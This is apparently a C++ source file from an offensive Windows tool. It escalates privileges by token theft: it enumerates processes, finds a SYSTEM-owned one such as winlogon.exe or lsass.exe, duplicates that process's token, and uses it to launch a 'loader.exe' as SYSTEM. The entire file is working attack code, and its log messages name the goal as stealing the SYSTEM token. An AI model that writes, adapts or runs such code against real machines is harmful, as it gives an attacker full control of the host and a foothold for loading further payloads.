#include "privesc.hpp"

int wmain() {
	Log("[+] Starting privesc.", "privesc");
	Log("[+] Beginning token impersonation.", "privesc");

	HANDLE hDuplicateToken = NULL;
	std::unique_ptr<void, decltype(&CloseHandle)> uphDuplicateToken(static_cast<void*>(hDuplicateToken), CloseHandle);

	int err = SystemToken(&hDuplicateToken);
	if (err != 0) {
		Log("[!] System token impersonation failed with error " + err, "privesc");
	}

	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);

	Log("[*] Attempting to create cmd with token.", "privesc");

	if (!CreateProcessWithTokenW(
		hDuplicateToken,
		LOGON_WITH_PROFILE,
		L"loader.exe",
		NULL,
		0,
		NULL,
		NULL,
		&si,
		&pi
	)) {
		Log("[!] Spawning loader as system failed", "privesc");
	}
	else {
		Log("[+] Successfully spawned loader", "privesc");
	}

	return 0;
}

int ImpersonateToken(DWORD dwPID, HANDLE* hNewToken) {
	Log("[*] Impersonating token from PID " + std::to_string(dwPID) + ", opening target", "privesc");

	// get handle to target process
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwPID);
	std::unique_ptr<void, decltype(&CloseHandle)> uphProcess(static_cast<void*>(hProcess), CloseHandle);

	// ensure handle to target is valid
	if (hProcess == NULL || hProcess == INVALID_HANDLE_VALUE) {
		Log("[!] Unable to get handle to target process", "privesc");
		return 1; // handle is invalid
	}

	Log("[+] Successfully obtained handle to target", "privesc");

	// get handle to target process' token
	HANDLE hProcessToken = NULL;
	std::unique_ptr<void, decltype(&CloseHandle)> uphProcessToken(static_cast<void*>(hProcessToken), CloseHandle);
	if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hProcessToken)) {
		Log("[!] Unable to open target process' token", "privesc");
		return 2;
	}

	Log("[+] Successfully obtained handle to token", "privesc");

	// duplicate the token
	DWORD dwDesiredAccess = TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY;
	if (!DuplicateTokenEx(hProcessToken, dwDesiredAccess, NULL, SecurityDelegation, TokenPrimary, hNewToken)) {
		Log("[!] Unable to duplicate token", "privesc");
		return 3;
	}

	Log("[+] Successfully duplicated SYSTEM token", "privesc");

	return 0;
}

int SystemToken(HANDLE* hNewToken) {
	Log("[*] Locating target system processes", "privesc");

	// processes that we can steal a system token from as admin
	// source: https://posts.specterops.io/understanding-and-defending-against-access-token-theft-finding-alternatives-to-winlogon-exe-80696c8a73b
	std::vector<std::wstring> vTargets = { L"wininit.exe", L"smss.exe", L"services.exe", L"winlogon.exe", L"unsecapp.exe", L"csrss.exe", L"dllhost.exe", L"lsass.exe" };

	PROCESSENTRY32W pe;
	pe.dwSize = sizeof(pe);
	bool bTargetFound = false;
	DWORD dwTarget = 0;

	// get list of processes currently running on system
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 1);
	std::unique_ptr<void, decltype(&CloseHandle)> uphSnapshot(static_cast<void*>(hSnapshot), CloseHandle);
	if (hSnapshot == INVALID_HANDLE_VALUE || Process32FirstW(hSnapshot, &pe) == false) {
		Log("[!] Snapshot of processes is invalid or empty", "privesc");
		return 1; // list of processes is invalid or empty
	}

	// loop through the list of processes
	do {
		// check if a processes is one which we can steal system token from
		for (std::wstring exe : vTargets) {
			if (exe.compare(pe.szExeFile) == 0) {
				dwTarget = pe.th32ProcessID;
				break;
			}
		}
	} while (dwTarget == 0 && Process32NextW(hSnapshot, &pe));

	if (dwTarget == 0) {
		Log("[!] Could not find a process to steal system token from", "privesc");
		return 2; // did not find a process to steal system token from
	}

	Log("[+] Found PID " + std::to_string(dwTarget) + " to target", "privesc");

	// impersonate system token
	return ImpersonateToken(dwTarget, hNewToken);
}